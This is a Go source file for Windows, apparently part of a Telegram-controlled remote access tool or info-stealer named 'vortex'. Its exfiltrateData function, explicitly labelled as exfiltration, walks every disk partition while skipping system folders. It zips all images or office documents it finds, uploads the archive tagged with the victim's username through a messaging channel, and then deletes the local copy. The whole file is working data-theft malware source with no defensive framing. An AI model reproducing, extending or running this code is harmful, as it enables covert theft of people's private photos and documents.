//go:build windows

package telehandler

import (
	"archive/zip"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"vortex/opsysinfo"
)

func zipFiles(fPath string, zipWriter *zip.Writer) error {

	file, err := os.Open(fPath)
	if err != nil {
		return err
	}
	defer file.Close()

	writer, err := zipWriter.Create(filepath.Base(file.Name()))
	if err != nil {
		return err
	}

	if _, err = io.Copy(writer, file); err != nil {
		return err
	}

	return nil
}

// Exfiltrate Data to specific location and upload it
func exfiltrateData(fileType string, dataStoreLocation string) error {

	var (
		extensions       []string
		zipDataPath      = filepath.Join(dataStoreLocation, opsysinfo.MachineSpecs().HostID+".zip")
		imagesExtensions = []string{".jpg", ".jpeg", ".jfif", ".png", ".png"}
		docsExtensions   = []string{".doc", ".docx", ".xls", ".xlsx", ".ods", ".pdf"}
	)

	if _, err := os.Stat(dataStoreLocation); os.IsNotExist(err) {
		return err
	}

	zipFile, err := os.Create(zipDataPath)
	if err != nil {
		return err
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	for _, partition := range opsysinfo.HardDriveInfo().DiskPartitions {
		if err := filepath.Walk(partition+"\\", func(path string, info fs.FileInfo, err error) error {
			if err != nil {
				return filepath.SkipDir
			}
			if strings.Contains(path, "C:\\Windows") ||
				strings.Contains(path, "C:\\Program Files") ||
				strings.Contains(path, "C:\\$Recycle.Bin") ||
				strings.Contains(path, "C:\\ProgramData") {
				return filepath.SkipDir
			}
			switch fileType {
			case "images":
				extensions = imagesExtensions
			case "documents":
				extensions = docsExtensions
			}

			for _, ext := range extensions {
				if filepath.Ext(info.Name()) == ext && !info.IsDir() {
					if err = zipFiles(path, zipWriter); err != nil {
						return err
					}
				}
			}
			return nil

		}); err != nil {
			return err
		}

		fZipInfo, _ := os.Stat(zipDataPath)
		SendMessage(fmt.Sprintf("💹 Data uploading size: %d MB", fZipInfo.Size()/1024/1024))
		UploadFile(zipDataPath, "🌠 Data of "+opsysinfo.MachineSpecs().Username)
		os.Remove(zipDataPath)
		SendSticker()
		break
	}

	return nil
}
